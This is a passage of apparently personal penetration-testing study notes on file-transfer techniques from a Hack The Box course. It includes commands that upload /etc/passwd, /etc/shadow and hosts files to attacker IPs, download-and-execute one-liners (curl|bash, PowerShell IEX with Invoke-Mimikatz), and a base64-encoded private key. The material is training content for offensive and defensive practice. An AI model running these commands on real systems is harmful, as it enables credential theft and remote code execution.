IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d \u003e hosts\nPietra@htb[/htb]$ md5sum hosts \n3688374325b992def12793500307566d  hosts\n```\n\n#### PowerShell Web Uploads\nPowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.\n\nFor our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver.\n\n- Installing a configured WebServer with upload:\n\n```shell\nPietra@htb[/htb]$ pip3 install upload server\n\nPietra@htb[/htb]$ python3 -m uploadserver\nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\nNow we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-WebRequest` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.\n\n- PowerShell script to upload a file to Python upload server:\n\n```powershell\nPS C:\\htb\u003e IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nPS C:\\htb\u003e Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n\n[+] File Uploaded:  C:\\Windows\\System32\\drivers\\etc\\hosts\n[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373\n```\n\n#### PowerShell Base64 Web Upload\nAnother way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.\n\n```powershell\nPS C:\\htb\u003e $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nPS C:\\htb\u003e Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n```\n\nWe catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.\n\n```shell\nPietra@htb[/htb]$ nc -lvnp 8000\nPietra@htb[/htb]$ echo \u003cbase64\u003e | base64 -d -w 0 \u003e hosts\n```\n\n#### SMB Uploads\nWe previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).\n\nAn alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](RFC%204918)) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.\n\nWhen you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share `testing3`, and because it didn't find anything with `SMB`, it uses `HTTP`.\n\n![Image](https://academy.hackthebox.com/storage/modules/24/smb-webdav-wireshark.png)\n\n#### Configuring webdav server\nTo set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.\n\n- Installing WebDav Python modules:\n\n```shell\nPietra@htb[/htb]$ sudo pip install wsgidav cheroot\n\n[sudo] password for plaintext: \nCollecting wsgidav\n  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)\n     |████████████████████████████████| 171 kB 1.4 MB/s\n     ...SNIP...\n```\n\n- Using the WebDav Python module:\n\n```shell\nPietra@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n\n[sudo] password for plaintext: \nRunning without configuration file.\n10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.\n10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31\n10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)\n10:02:53.950 - INFO    : Property manager:  None\n10:02:53.950 - INFO    : Domain controller: SimpleDomainController()\n10:02:53.950 - INFO    : Registered DAV providers by route:\n10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)\n10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)\n10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.\n10:02:53.950 - WARNING : Share '/' will allow anonymous write access.\n10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.\n10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2\n10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...\n```\n\n- Connecting to the Webdav Share\nNow we can attempt to connect to the share using the `DavWWWRoot` directory.\n\n```cmd\nC:\\htb\u003e dir \\\\192.168.49.128\\DavWWWRoot\n\n Volume in drive \\\\192.168.49.128\\DavWWWRoot has no label.\n Volume Serial Number is 0000-0000\n\n Directory of \\\\192.168.49.128\\DavWWWRoot\n\n05/18/2022  10:05 AM    \u003cDIR\u003e          .\n05/18/2022  10:05 AM    \u003cDIR\u003e          ..\n05/18/2022  10:05 AM    \u003cDIR\u003e          sharefolder\n05/18/2022  10:05 AM                13 filetest.txt\n               1 File(s)             13 bytes\n               3 Dir(s)  43,443,318,784 bytes free\n```\n\n**Note:** `DavWWWRoot` is a special keyword recognised by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.\n\nYou can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: `\\192.168.49.128\\sharefolder`.\n\n- Uploading Files using SMB\n\n```cmd\nC:\\htb\u003e copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\\nC:\\htb\u003e copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\\n```\n\n**Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.\n\n#### FTP Uploads\nUploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.\n\n- Uploading files using SMB:\n\n```shell\nPietra@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write\n\n/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.\n  warnings.warn(\"write permissions assigned to anonymous user.\",\n[I 2022-05-18 10:33:31] concurrency model: async\n[I 2022-05-18 10:33:31] masquerade (NAT) address: None\n[I 2022-05-18 10:33:31] passive ports: None\n[I 2022-05-18 10:33:31] \u003e\u003e\u003e starting FTP server on 0.0.0.0:21, pid=5155 \u003c\u003c\u003c\n```\n\nNow let's use the PowerShell upload function to upload a file to our FTP Server.\n\n- PowerShell upload file:\n\n```powershell\nPS C:\\htb\u003e (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n```\n\n- Create a command file for the FTP client to upload a file:\n\n```cmd\nC:\\htb\u003e echo open 192.168.49.128 \u003e ftpcommand.txt\nC:\\htb\u003e echo USER anonymous \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo binary \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo PUT c:\\windows\\system32\\drivers\\etc\\hosts \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo bye \u003e\u003e ftpcommand.txt\nC:\\htb\u003e ftp -v -n -s:ftpcommand.txt\nftp\u003e open 192.168.49.128\nLog in with USER and PASS first.\nftp\u003e USER anonymous\n\nftp\u003e PUT c:\\windows\\system32\\drivers\\etc\\hosts\nftp\u003e bye\n```\n# Linux\nLinux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.\n\nA few years ago, we were contacted to perform incident response on some web servers. We found multiple threat actors in six out of the nine web servers we investigated. The threat actor found a SQL Injection vulnerability. They used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.\n\nThe Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. Its first attempt was to use `cURL`. If that failed, it attempted to use `wget`, and if that failed, it used `Python`. All three methods use `HTTP` to communicate.\n\nAlthough Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems uses `HTTP` and `HTTPS` for communication.\n\nThis section will review multiple ways to transfer files on Linux, including HTTP, Bash, SSH, etc.\n\n## Download Operations\nWe have access to the machine `NIX04`, and we need to download a file from our `Pwnbox` machine. Let's see how we can accomplish this using multiple file download methods.\n\n![image](https://academy.hackthebox.com/storage/modules/24/LinuxDownloadUpload.drawio.png)\n\n### Base64 Encoding / Decoding\nDepending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.\n\n#### Pwnbox - Check File MD5 hash\n\n```shell\nPietra@htb[/htb]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n```\n\nWe use `cat` to print the file content, and base64 encode the output using a pipe `|`. We used the option `-w 0` to create only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.\n\n#### Pwnbox - Encode SSH Key to Base64\n\n```shell\nPietra@htb[/htb]$ cat id_rsa |base64 -w 0;echo\n\nLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\n```\n\nWe copy this content, paste it onto our Linux target machine, and use `base64` with the option \\`-d' to decode it.\n\n#### Linux - Decode the File\n\n```shell\nPietra@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d \u003e id_rsa\n```\n\nFinally, we can confirm if the file was transferred successfully using the `md5sum` command.\n\n#### Linux - Confirm the MD5 Hashes Match\n\n```shell\nPietra@htb[/htb]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n```\n\n**Note:** You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.\n\n### Web Downloads with Wget and cURL\nTwo of the most common utilities in Linux distributions to interact with web applications are `wget` and `curl`. These tools are installed on many Linux distributions.\n\nTo download a file using `wget`, we need to specify the URL and the option \\`-O' to set the output filename.\n\n#### Download a File Using wget\n\n```shell\nPietra@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\n```\n\n`cURL` is very similar to `wget`, but the output filename option is lowercase \\`-o'.\n\n#### Download a File Using cURL\n\n```shell\nPietra@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\n```\n\n### Fileless Attacks Using Linux\nBecause of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.\n\n**Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.\n\nLet's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.\n\n#### Fileless Download with cURL\n\n```shell\nPietra@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash\n```\n\nSimilarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.\n\n#### Fileless Download with wget\n\n```shell\nPietra@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3\n\nHello World!\n```\n\n### Download with Bash (/dev/tcp)\nThere may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.\n\n#### Connect to the Target Webserver\n\n```shell\nPietra@htb[/htb]$ exec 3\u003c\u003e/dev/tcp/10.10.10.32/80\n```\n\n#### HTTP GET Request\n\n```shell\nPietra@htb[/htb]$ echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\"\u003e\u00263\n```\n\n#### Print the Response\n\n```shell\nPietra@htb[/htb]$ cat \u003c\u00263\n```\n\n### SSH Downloads\nSSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.\n\n`SCP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.\n\n`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.\n\nBefore we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.\n\n#### Enabling the SSH Server\n\n```shell\nPietra@htb[/htb]$ sudo systemctl enable ssh\n\nSynchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.\nExecuting: /lib/systemd/systemd-sysv-install enable ssh\nUse of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, \u003cDATA\u003e line 45\n...SNIP...\n```\n\n#### Starting the SSH Server\n\n```shell\nPietra@htb[/htb]$ sudo systemctl start ssh\n```\n\n#### Checking for SSH Listening Port\n\n```shell\nPietra@htb[/htb]$ netstat -lnpt\n\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - \n```\n\nNow we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.\n\n#### Linux - Downloading Files Using SCP\n\n```shell\nPietra@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . \n```\n\n**Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.\n\n## Upload Operations\nThere are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.\n\n### Web Upload\nAs mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.\n\nThe first thing we need to do is to install the `uploadserver` module.\n\n#### Pwnbox - Start Web Server\n\n```shell\nPietra@htb[/htb]$ python3 -m pip install --user uploadserver\n\nCollecting uploadserver\n  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)\nInstalling collected packages: uploadserver\nSuccessfully installed uploadserver-2.0.1\n```\n\nNow we need to create a certificate. In this example, we are using a self-signed certificate.\n\n#### Pwnbox - Create a Self-Signed Certificate\n\n```shell\nPietra@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\n\nGenerating a RSA private key\n................................................................................+++++\n.......+++++\nwriting new private key to 'server.pem'\n-----\n```\n\nThe webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.\n\n#### Pwnbox - Start Web Server\n\n```shell\nPietra@htb[/htb]$ mkdir https \u0026\u0026 cd https\n```\n\n```shell\nPietra@htb[/htb]$ python3 -m uploadserver 443 --server-certificate /root/server.pem\n\nFile upload available at /upload\nServing HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...\n```\n\nNow from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.\n\n#### Linux - Upload Multiple Files\n\n```shell\nPietra@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n```\n\nWe used the option `--insecure` because we used a self-signed certificate that we trust.\n\n### Alternative Web File Transfer Method\nSince Linux distributions usually have `Python` or `php` installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.\n\nIt is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.\n\n#### Linux - Creating a Web Server with Python3\n\n```shell\nPietra@htb[/htb]$ python3 -m http.server\n\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\n#### Linux - Creating a Web Server with Python2.7\n\n```shell\nPietra@htb[/htb]$ python2.7 -m SimpleHTTPServer\n\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\n#### Linux - Creating a Web Server with PHP\n\n```shell\nPietra@htb[/htb]$ php -S 0.0.0.0:8000\n\n[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started\n```\n\n#### Linux - Creating a Web Server with Ruby\n\n```shell\nPietra@htb[/htb]$ ruby -run -ehttpd . -p8000\n\n[2022-05-23 09:35:46] INFO  WEBrick 1.6.1\n[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]\n[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000\n```\n\n#### Download the File from the Target Machine onto the Pwnbox\n\n```shell\nPietra@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt\n\n--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt\nConnecting to 192.168.49.128:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 0 [text/plain]\nSaving to: 'filetotransfer.txt'\n\nfiletotransfer.txt                       [ \u003c=\u003e                                                                  ]       0  --.-KB/s    in 0s      \n\n2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]\n```\n\n**Note:** When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.\n\n### SCP Upload\nWe may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file using the SSH protocol.\n\n#### File Upload using SCP\n\n```shell\nPietra@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/\n\nplaintext@192.168.49.128's password: \npasswd                                                                                                           100% 3414     6.7MB/s   00:00\n```\n\n**Note:** Remember that scp syntax is similar to cp or copy.\n\n# CheatSheet\n| **Command** | **Description** |\n| --------------|-------------------|\n| `Invoke-WebRequest https://\u003csnip\u003e/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |\n| `IEX (New-Object Net.WebClient).DownloadString('https://\u003csnip\u003e/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |\n| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |\n| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe` | Download a file using Bitsadmin |\n| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |\n| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |\n| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |\n| `php -r '$file = file_get_contents(\"https://\u003csnip\u003e/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'` | Download a file using PHP |\n| `scp C:\\Temp\\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |\n| `scp user@target:/tmp/mimikatz.exe C:\\Temp\\mimikatz.exe` | Download a file using SCP |\n| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile \"nc.exe\"` | Invoke-WebRequest using a Chrome User Agent |\n",
    "lastmodified": "2022-11-24T12:20:59.389598966Z",
    "tags": null
  },
  "/notes/general/htb-intro-networking": {
    "title": "Introduction to Networking",
    "content": "# Introduction to Networking\n---\n## Overview\nThere is a wide array of **topologies** (mesh, tree, star), **mediums** (ethernet, fiber, coax, wireless) and **protocols** (TCP, UDP, IPX).\n\n## Story Time - A Pentesters Oversight\nMost networks use a `/24` subnet, so much so that many Penetration Testers will set this subnet mask (255.255.255.0) without checking. The /24 network allows computers to talk to each other as long as the first three octets of an IP Address are the same (ex: 192.168.1.xxx). Setting the subnet mask to `/25` divides this range in half, and the computer will be able to talk to only the computers on \"its half.\" We have seen Penetration Test reports where the assessor claimed a Domain Controller was offline when it was just on a different network in reality. The network structure was something like this:\n\n-   Server Gateway: 10.20.0.1/25\n-   Domain Controller: 10.20.0.10/25\n-   Client Gateway: 10.20.0.129/25\n-   Client Workstation: 10.20.0.200/25\n-   Pentester IP: 10.20.0.252/24 (Set Gateway to 10.20.0.1)\n\nThe Pentester communicated with the Client Workstations and thought they did an excellent job because they managed to steal a workstation password via Impacket. However, due to a failure to understand the network, they never managed to get off the Client Network and reach more \"high value\" targets such as database servers. \n\n## Networking Models\nTwo networking models describe the communication and transfer of data from one host to another, called `ISO/OSI model` and the `TCP/IP model`. This is a simplified representation of the so-called `layers` representing transferred Bits in readable contents for us.\n\n![image](https://academy.hackthebox.com/storage/modules/34/redesigned/net_models4.png)\n\n### The OSI Model\nThe `OSI` model, often referred to as `ISO/OSI` layer model, is a reference model that can be used to describe and define the communication between systems. The reference model has `seven` individual layers, each with clearly separated tasks.\n\nThe term `OSI` stands for `Open Systems Interconnection` model, published by the `International Telecommunication Union` (`ITU`) and the `International Organization for Standardization` (`ISO`). Therefore, the `OSI` model is often referred to as the `ISO/OSI` layer model.\n\nThe 